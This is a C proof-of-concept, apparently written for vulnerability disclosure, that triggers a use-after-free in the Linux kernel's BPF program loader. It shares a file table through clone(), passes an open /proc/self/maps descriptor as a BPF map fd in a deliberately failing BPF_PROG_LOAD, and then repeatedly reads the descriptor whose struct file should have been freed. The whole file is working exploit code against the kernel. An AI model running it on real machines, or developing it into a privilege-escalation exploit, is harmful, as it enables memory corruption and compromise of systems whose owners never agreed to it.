#define _GNU_SOURCE
#include <errno.h>
#include <err.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <linux/bpf.h>

#ifndef __NR_bpf
# if defined(__i386__)
#  define __NR_bpf 357
# elif defined(__x86_64__)
#  define __NR_bpf 321
# elif defined(__aarch64__)
#  define __NR_bpf 280
# else
#  error
# endif
#endif

int do_nothing(void *p) {
  prctl(PR_SET_PDEATHSIG, SIGKILL);
  while (1) sleep(1);
}

int main(void) {
	char buf[4096];

	char child_stack[8000];
	int child = clone(do_nothing, child_stack + sizeof(child_stack), CLONE_FILES, NULL);
	if (child == -1)
		err(1, "clone");

	int uaf_fd = open("/proc/self/maps", O_RDONLY);
	if (uaf_fd == -1)
		err(1, "unable to open UAF fd");

	struct bpf_insn insns[2] = {
		{
			.code = BPF_LD | BPF_IMM | BPF_DW,
			.src_reg = BPF_PSEUDO_MAP_FD,
			.imm = uaf_fd
		},
		{
		}
	};
	union bpf_attr attr = {
		.prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
		.insn_cnt = 2,
		.insns = (__aligned_u64) insns,
		.license = (__aligned_u64)""
	};
	if (syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr)) != -1)
		errx(1, "expected BPF_PROG_LOAD to fail, but it didn't");
	if (errno != EINVAL)
		err(1, "expected BPF_PROG_LOAD to fail with -EINVAL, got different error");

	while (1) {
		sleep(1);
		/* at this point, the struct file of uaf_fd should be freed */
		ssize_t res = read(uaf_fd, buf, 4096);
		if (res == -1)
			err(1, "unable to read from uaf_fd post-UAF");
		if (res == 0)
			errx(1, "unable to read from uaf_fd post-UAF (EOF)");
		write(1, buf, res);
		lseek(uaf_fd, 0, SEEK_SET);
	}
}
